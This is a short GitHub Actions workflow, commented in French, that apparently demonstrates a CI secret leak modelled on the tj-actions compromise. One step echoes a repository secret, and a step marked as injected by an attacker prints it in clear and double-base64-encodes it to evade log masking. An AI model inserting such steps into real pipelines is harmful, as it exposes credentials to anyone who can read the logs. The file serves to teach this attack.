name: Demo leak secret compromis

on: [push]

jobs:
  demo:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      # √âtape normale (l√©gitime)
      - name: Affichage l√©gitime
        run: |
          echo "----- D√©but du log l√©gitime -----"
          echo "La valeur du secret est : $DEMO_SECRET"
          echo "----- Fin du log l√©gitime -----"
        env:
          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}

      # üö® √âtape malveillante ajout√©e par un attaquant
      - name: üö® √âtape compromise : extraction du secret en clair
        run: |
          echo ""
          echo "===== ‚ö†Ô∏è ATTACKER PAYLOAD ACTIV√â ====="
          echo "[Attacker] Lecture de la variable d'environnement..."
          echo "[Attacker] Secret exfiltr√© en clair : $DEMO_SECRET"
          echo ""
          echo "[Attacker] Double encodage Base64 (comme l'attaque tj-actions) :"
          encoded=$(echo -n "$DEMO_SECRET" | base64 | base64)
          echo "$encoded"
          echo ""
          echo "[Attacker] D√©codage pour r√©cup√©rer le secret r√©el :"
          echo "$encoded" | base64 -d | base64 -d
          echo "===== ‚ö†Ô∏è FIN DU PAYLOAD ====="
        env:
          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
